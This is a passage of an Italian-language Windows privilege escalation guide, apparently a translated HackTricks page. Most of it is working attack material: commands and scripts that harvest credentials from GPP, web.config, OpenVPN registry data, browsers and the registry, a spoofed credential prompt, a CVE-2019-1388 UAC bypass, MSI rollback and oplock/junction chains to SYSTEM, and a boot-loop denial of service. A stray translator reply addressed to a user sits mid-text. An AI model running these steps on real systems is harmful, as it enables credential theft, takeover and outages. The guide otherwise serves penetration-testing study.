gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usando crackmapexec per ottenere le password:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Esempio di web.config con credenziali:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenziali OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Log
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Chiedi le credenziali

Puoi sempre **chiedere all'utente di inserire le sue credenziali o anche le credenziali di un altro utente** se pensi che possa conoscerle (nota che **chiedere** direttamente al client le **credenziali** è davvero **rischioso**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Possibili nomi di file contenenti credenziali**

File noti che in passato contenevano **password** in **testo in chiaro** o **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Non hai fornito l’elenco dei file proposti da cercare.

Inviami i nomi o i percorsi dei file e li traduco/conservo nel formato richiesto.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenziali nel RecycleBin

Dovresti anche controllare il Bin per cercare credenziali al suo interno

Per **recuperare password** salvate da diversi programmi puoi usare: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### All'interno del registry

**Altre possibili chiavi del registry con credenziali**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Estrarre chiavi openssh dal registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

Dovresti controllare i db in cui sono memorizzate le password di **Chrome or Firefox**.\
Controlla anche la history, i bookmarks e i favourites dei browser, così magari alcune **password are** memorizzate lì.

Tools per estrarre passwords dai browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** è una technology integrata nel sistema operativo Windows che permette la **intercommunication** tra componenti software di linguaggi diversi. Ogni componente COM è **identified via** un class ID (CLSID) e ogni componente espone funzionalità tramite una o più interfaces, identificate tramite interface IDs (IIDs).

Le classi e le interfaces COM sono definite nel registry sotto **HKEY\CLASSES\ROOT\CLSID** e **HKEY\CLASSES\ROOT\Interface** rispettivamente. Questo registry è creato unendo **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

All'interno dei CLSID di questo registry puoi trovare il child registry **InProcServer32** che contiene un **default value** che punta a una **DLL** e un valore chiamato **ThreadingModel** che può essere **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) oppure **Neutral** (Thread Neutral).

![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)

Fondamentalmente, se puoi **overwrite any of the DLLs** che verranno eseguite, potresti **escalate privileges** se quella DLL verrà eseguita da un altro user.

Per imparare come gli attackers usano il COM Hijacking come meccanismo di persistence, controlla:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Cerca un file con un determinato nome file**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Cerca nel registro chiavi e password**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Strumenti che cercano password

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin ho creato questo plugin per **eseguire automaticamente ogni modulo POST di metasploit che cerca credenziali** all'interno della vittima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) cerca automaticamente tutti i file contenenti password menzionati in questa pagina.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) è un altro ottimo strumento per estrarre password da un sistema.

Lo strumento [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) cerca **sessioni**, **nomi utente** e **password** di diversi strumenti che salvano questi dati in testo in chiaro (PuTTY, WinSCP, FileZilla, SuperPuTTY, e RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Immagina che **un processo in esecuzione come SYSTEM apra un nuovo processo** (`OpenProcess()`) **con accesso completo**. Lo stesso processo **crei anche un nuovo processo** (`CreateProcess()`) **con privilegi bassi ma ereditando tutti gli open handle del processo principale**.\
Poi, se hai **accesso completo al processo con privilegi bassi**, puoi recuperare l’**open handle al processo privilegiato creato** con `OpenProcess()` e **injectare una shellcode**.\
[Leggi questo esempio per ulteriori informazioni su **come rilevare e sfruttare questa vulnerabilità**.](leaked-handle-exploitation.md)\
[Leggi questo **altro post per una spiegazione più completa su come testare e abusare di altri open handlers di processi e thread ereditati con diversi livelli di permessi (non solo accesso completo)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

I segmenti di memoria condivisa, chiamati **pipes**, consentono la comunicazione tra processi e il trasferimento di dati.

Windows fornisce una funzionalità chiamata **Named Pipes**, che permette a processi non correlati di condividere dati, anche su reti diverse. Questo assomiglia a un’architettura client/server, con ruoli definiti come **named pipe server** e **named pipe client**.

Quando i dati vengono inviati attraverso una pipe da un **client**, il **server** che ha configurato la pipe ha la possibilità di **assumere l’identità** del **client**, a condizione di avere i necessari diritti **SeImpersonate**. Identificare un **processo privilegiato** che comunica tramite una pipe che puoi imitare offre l’opportunità di **ottenere privilegi più elevati** adottando l’identità di quel processo una volta che interagisce con la pipe che hai stabilito. Per istruzioni su come eseguire un attacco del genere, puoi trovare guide utili [**qui**](named-pipe-client-impersonation.md) e [**qui**](#from-high-integrity-to-system).

Inoltre, il seguente tool consente di **intercettare una comunicazione su named pipe con uno strumento come burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e questo tool consente di elencare e vedere tutte le pipe per trovare privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Il servizio Telephony (TapiSrv) in modalità server espone `\\pipe\\tapsrv` (MS-TRP). Un client remoto autenticato può abusare del percorso asincrono degli eventi basato su mailslot per trasformare `ClientAttach` in una **scrittura arbitraria di 4 byte** su qualsiasi file esistente scrivibile da `NETWORK SERVICE`, poi ottenere i diritti di amministrazione di Telephony e caricare una DLL arbitraria come servizio. Flusso completo:

- `ClientAttach` con `pszDomainUser` impostato su un percorso esistente scrivibile → il servizio lo apre tramite `CreateFileW(..., OPEN_EXISTING)` e lo usa per le scritture degli eventi asincroni.
- Ogni evento scrive il `InitContext` controllato dall’attaccante da `Initialize` su quel handle. Registra una line app con `LRegisterRequestRecipient` (`Req_Func 61`), attiva `TRequestMakeCall` (`Req_Func 121`), recupera tramite `GetAsyncEvents` (`Req_Func 0`), poi annulla/chiudi per ripetere scritture deterministiche.
- Aggiungiti a `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, riconnettiti, poi chiama `GetUIDllName` con un percorso DLL arbitrario per eseguire `TSPI_providerUIIdentify` come `NETWORK SERVICE`.

Più dettagli:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Controlla la pagina **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

I link Markdown cliccabili inoltrati a `ShellExecuteExW` possono attivare handler URI pericolosi (`file:`, `ms-appinstaller:` o qualsiasi schema registrato) ed eseguire file controllati dall’attaccante come utente corrente. Vedi:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Quando ottieni una shell come un utente, potrebbero esserci scheduled tasks o altri processi in esecuzione che **passano credenziali nella command line**. Lo script qui sotto cattura le command line dei processi ogni due secondi e confronta lo stato corrente con quello precedente, restituendo eventuali differenze.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Se hai accesso all'interfaccia grafica (tramite console o RDP) e UAC è abilitato, in alcune versioni di Microsoft Windows è possibile avviare un terminale o qualsiasi altro processo come "NT\AUTHORITY SYSTEM" da un utente non privilegiato.

Questo rende possibile elevare i privilegi e aggirare UAC allo stesso tempo con la stessa vulnerabilità. Inoltre, non è necessario installare nulla e il binario usato durante il processo è firmato e rilasciato da Microsoft.

Alcuni dei sistemi interessati sono i seguenti:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Per sfruttare questa vulnerabilità, è necessario eseguire i seguenti passaggi:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Hai tutti i file e le informazioni necessari nel seguente repository GitHub:

https://github.com/jas502n/CVE-2019-1388

## Da Administrator Medium a High Integrity Level / UAC Bypass

Leggi questo per **imparare sugli Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Poi **leggi questo per imparare su UAC e sugli UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Da Arbitrary Folder Delete/Move/Rename a SYSTEM EoP

La tecnica descritta [**in questo post del blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) con un exploit code [**disponibile qui**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

L'attacco consiste sostanzialmente nell'abusare della funzionalità di rollback di Windows Installer per sostituire file legittimi con file malevoli durante il processo di disinstallazione. Per farlo, l'attaccante deve creare un **malicious MSI installer** che verrà usato per hijackare la cartella `C:\Config.Msi`, che poi verrà usata da Windows Installer per memorizzare i rollback files durante la disinstallazione di altri pacchetti MSI, i cui rollback files saranno stati modificati per contenere il payload malevolo.

La tecnica riassunta è la seguente:

1. **Fase 1 – Preparazione per l'hijack (lascia `C:\Config.Msi` vuota)**

- Passo 1: Installa il MSI
- Crea un `.msi` che installa un file innocuo (ad es. `dummy.txt`) in una cartella scrivibile (`TARGETDIR`).
- Contrassegna l'installer come **"UAC Compliant"**, così un **non-admin user** può eseguirlo.
- Mantieni un **handle** aperto sul file dopo l'installazione.

- Passo 2: Inizia la disinstallazione
- Disinstalla lo stesso `.msi`.
- Il processo di disinstallazione inizia a spostare i file in `C:\Config.Msi` e a rinominarli in file `.rbf` (rollback backups).
- **Poll the open file handle** usando `GetFinalPathNameByHandle` per rilevare quando il file diventa `C:\Config.Msi\<random>.rbf`.

- Passo 3: Sincronizzazione personalizzata
- Il `.msi` include una **custom uninstall action (`SyncOnRbfWritten`)** che:
- Segnala quando `.rbf` è stato scritto.
- Poi **attende** un altro evento prima di continuare la disinstallazione.

- Passo 4: Blocca l'eliminazione di `.rbf`
- Quando viene segnalato, **apri il file `.rbf`** senza `FILE_SHARE_DELETE` — questo **ne impedisce l'eliminazione**.
- Poi **segnala di nuovo** così la disinstallazione può terminare.
- Windows Installer non riesce a eliminare il `.rbf` e, poiché non può eliminare tutto il contenuto, **`C:\Config.Msi` non viene rimossa**.

- Passo 5: Elimina manualmente `.rbf`
- Tu (attaccante) elimini manualmente il file `.rbf`.
- Ora **`C:\Config.Msi` è vuota**, pronta per essere hijackata.

> A questo punto, **attiva la vulnerabilità di arbitrary folder delete a livello SYSTEM** per eliminare `C:\Config.Msi`.

2. **Fase 2 – Sostituire gli script di rollback con quelli malevoli**

- Passo 6: Ricrea `C:\Config.Msi` con ACL deboli
- Ricrea tu stesso la cartella `C:\Config.Msi`.
- Imposta **weak DACLs** (ad es. Everyone:F) e **mantieni un handle aperto** con `WRITE_DAC`.

- Passo 7: Esegui un'altra installazione
- Installa di nuovo il `.msi`, con:
- `TARGETDIR`: posizione scrivibile.
- `ERROROUT`: una variabile che forza un fallimento.
- Questa installazione servirà a innescare di nuovo il **rollback**, che legge `.rbs` e `.rbf`.

- Passo 8: Monitora `.rbs`
- Usa `ReadDirectoryChangesW` per monitorare `C:\Config.Msi` finché non appare un nuovo `.rbs`.
- Cattura il suo nome file.

- Passo 9: Sincronizza prima del rollback
- Il `.msi` contiene una **custom install action (`SyncBeforeRollback`)** che:
- Segnala un evento quando `.rbs` viene creato.
- Poi **attende** prima di continuare.

- Passo 10: Riapplica ACL deboli
- Dopo aver ricevuto l'evento `.rbs created`:
- Windows Installer **riapplica ACL forti** a `C:\Config.Msi`.
- Ma poiché hai ancora un handle con `WRITE_DAC`, puoi **riapplicare di nuovo ACL deboli**.

> Le ACL vengono **enforced only on handle open**, quindi puoi ancora scrivere nella cartella.

- Passo 11: Inserisci `.rbs` e `.rbf` falsi
- Sovrascrivi il file `.rbs` con un **fake rollback script** che dice a Windows di:
- Ripristinare il tuo file `.rbf` (DLL malevola) in una **posizione privilegiata** (ad es. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Depositare il tuo fake `.rbf` contenente una **malicious SYSTEM-level payload DLL**.

- Passo 12: Attiva il rollback
- Segnala l'evento di sync così l'installer riprende.
- Un **custom action type 19 (`ErrorOut`)** è configurato per **fallire intenzionalmente l'installazione** in un punto noto.
- Questo causa l'inizio del **rollback**.

- Passo 13: SYSTEM installa la tua DLL
- Windows Installer:
- Legge il tuo `.rbs` malevolo.
- Copia la tua DLL `.rbf` nella posizione di destinazione.
- Ora hai la tua **DLL malevola in un percorso caricato da SYSTEM**.

- Passo finale: esegui codice come SYSTEM
- Avvia un binario **auto-elevated** affidabile (ad es. `osk.exe`) che carica la DLL che hai hijackato.
- **Boom**: il tuo codice viene eseguito **come SYSTEM**.


### Da Arbitrary File Delete/Move/Rename a SYSTEM EoP

La tecnica principale di rollback MSI (la precedente) presume che tu possa eliminare un **intero folder** (ad es. `C:\Config.Msi`). Ma cosa succede se la tua vulnerabilità consente solo **arbitrary file deletion** ?

Potresti sfruttare gli **NTFS internals**: ogni cartella ha un hidden alternate data stream chiamato:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Questo stream memorizza i **metadati dell'indice** della cartella.

Quindi, se **elimini lo stream `::$INDEX_ALLOCATION`** di una cartella, NTFS **rimuove l'intera cartella** dal filesystem.

Puoi farlo usando API standard di eliminazione file come:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Anche se stai chiamando una API di eliminazione di un *file*, in realtà **elimina la cartella stessa**.

### Da eliminazione del contenuto della cartella a SYSTEM EoP
Cosa succede se il tuo primitive non ti permette di eliminare file/cartelle arbitrari, ma **consente l’eliminazione del *contenuto* di una cartella controllata dall’attaccante**?

1. Step 1: Prepara una cartella e un file esca
- Crea: `C:\temp\folder1`
- Al suo interno: `C:\temp\folder1\file1.txt`

2. Step 2: Applica un **oplock** su `file1.txt`
- L’oplock **mette in pausa l’esecuzione** quando un processo privilegiato tenta di eliminare `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: Attiva il processo SYSTEM (ad esempio, `SilentCleanup`)
- Questo processo scansiona le cartelle (ad esempio, `%TEMP%`) e prova a eliminare il loro contenuto.
- Quando raggiunge `file1.txt`, l'**oplock si attiva** e passa il controllo al tuo callback.

4. Step 4: Dentro il callback dell'oplock – reindirizza l'eliminazione

- Opzione A: Sposta `file1.txt` altrove
- Questo svuota `folder1` senza rompere l'oplock.
- Non eliminare direttamente `file1.txt` — ciò rilascerebbe l'oplock prematuramente.

- Opzione B: Converte `folder1` in un **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opzione C: Crea un **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Questo prende di mira lo stream interno NTFS che memorizza i metadati della cartella — eliminarlo elimina la cartella.

5. Step 5: Rilascia l'oplock
- Il processo SYSTEM continua e prova a eliminare `file1.txt`.
- Ma ora, a causa del junction + symlink, in realtà sta eliminando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` viene eliminato da SYSTEM.

### Da Arbitrary Folder Create a Permanent DoS

Sfrutta un primitive che ti permette di **creare una cartella arbitraria come SYSTEM/admin** — anche se **non puoi scrivere file** o **impostare permessi deboli**.

Crea una **cartella** (non un file) con il nome di un **driver critico di Windows**, ad esempio:
```
C:\Windows\System32\cng.sys
```
- Questo path normalmente corrisponde al driver in modalità kernel `cng.sys`.
- Se lo **pre-crei come cartella**, Windows non riesce a caricare il driver reale all’avvio.
- Poi Windows tenta di caricare `cng.sys` durante il boot.
- Vede la cartella, **non riesce a risolvere il driver reale**, e **crasha o interrompe il boot**.
- Non c’è **fallback**, e **nessun recupero** senza intervento esterno (ad es. riparazione del boot o accesso al disco).

### Da path privilegiati di log/backup + OM symlinks a arbitrary file overwrite / boot DoS

Quando un **privileged service** scrive log/export in un path letto da una **config scrivibile**, reindirizza quel path con **Object Manager symlinks + NTFS mount points** per trasformare la scrittura privilegiata in un arbitrary overwrite (anche **senza** SeCreateSymbolicLinkPrivilege).

**Requisiti**
- La config che memorizza il path di destinazione è scrivibile dall’attaccante (es. `%ProgramData%\...\.ini`).
- Possibilità di creare un mount point verso `\RPC Control` e un OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Un’operazione privilegiata che scrive su quel path (log, export, report).

**Esempio di chain**
1. Leggi la config per recuperare la destinazione privilegiata del log, ad es. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Reindirizza il path senza admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Attendi che il componente privilegiato scriva il log (ad esempio, l'admin attiva "send test SMS"). La scrittura ora finisce in `C:\Windows\System32\cng.sys`.
4. Ispeziona il target sovrascritto (hex/PE parser) per confermare la corruzione; il reboot forza Windows a caricare il path del driver manomesso → **boot loop DoS**. Questo si generalizza anche a qualsiasi file protetto che un servizio privilegiato aprirà in scrittura.

> `cng.sys` viene normalmente caricato da `C:\Windows\System32\drivers\cng.sys`, ma se esiste una copia in `C:\Windows\System32\cng.sys` può essere tentata per prima, rendendolo un sink DoS affidabile per dati corrotti.



## **Da High Integrity a System**

### **Nuovo servizio**

Se stai già eseguendo su un processo High Integrity, il **percorso verso SYSTEM** può essere semplice: basta **creare ed eseguire un nuovo servizio**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Quando crei un binary di servizio assicurati che sia un servizio valido o che il binary esegua le azioni necessarie abbastanza rapidamente, altrimenti verrà terminato dopo 20s se non è un servizio valido.

### AlwaysInstallElevated

Da un processo High Integrity potresti provare a **abilitare le voci di registro AlwaysInstallElevated** e **installare** una reverse shell usando un wrapper _.msi_.\
[Ulteriori informazioni sulle chiavi di registro coinvolte e su come installare un pacchetto _.msi_ qui.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Puoi** [**trovare il codice qui**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Se hai questi token privileges (probabilmente lo troverai in un processo già High Integrity), potrai **aprire quasi qualsiasi processo** (non protected processes) con il privilegio SeDebug, **copiare il token** del processo e creare un **arbitrary process con quel token**.\
Di solito con questa tecnica si **sceglie qualsiasi processo in esecuzione come SYSTEM con tutti i token privileges** (_sì, puoi trovare processi SYSTEM senza tutti i token privileges_).\
**Puoi trovare un** [**esempio di codice che esegue la tecnica proposta qui**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Questa tecnica è usata da meterpreter per fare escalation in `getsystem`. La tecnica consiste nel **creare una pipe e poi creare/abuse un servizio per scrivere su quella pipe**. Poi il **server** che ha creato la pipe usando il privilegio **`SeImpersonate`** potrà **impersonare il token** del client della pipe (il servizio) ottenendo privilegi SYSTEM.\
Se vuoi [**saperne di più sulle name pipes dovresti leggere questo**](#named-pipe-client-impersonation).\
Se vuoi leggere un esempio di [**come passare da high integrity a System usando le name pipes dovresti leggere questo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se riesci a **hijackare una dll** che viene **caricata** da un **processo** in esecuzione come **SYSTEM** potrai eseguire codice arbitrario con quei permessi. Quindi il Dll Hijacking è utile anche per questo tipo di privilege escalation e, inoltre, è **molto più facile da ottenere da un processo high integrity** perché avrà **permessi di scrittura** sulle cartelle usate per caricare le dll.\
**Puoi** [**saperne di più sul Dll hijacking qui**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Leggi:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Verifica la presenza di misconfigurations e file sensibili (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Rilevato.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Verifica alcune possibili misconfigurations e raccoglie informazioni (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Verifica le misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Estrae informazioni sulle sessioni salvate di PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Usa -Thorough in locale.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Estrae credenziali da Credential Manager. Rilevato.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Fa password spray con le password raccolte nel domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh è uno strumento PowerShell ADIDNS/LLMNR/mDNS spoofer e man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumerazione base di Windows per privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) [~~**~~**~~ -- Cerca vulnerabilità privesc note (DEPRECATO per Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Controlli locali **(Servono diritti Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Cerca vulnerabilità privesc note (deve essere compilato usando VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
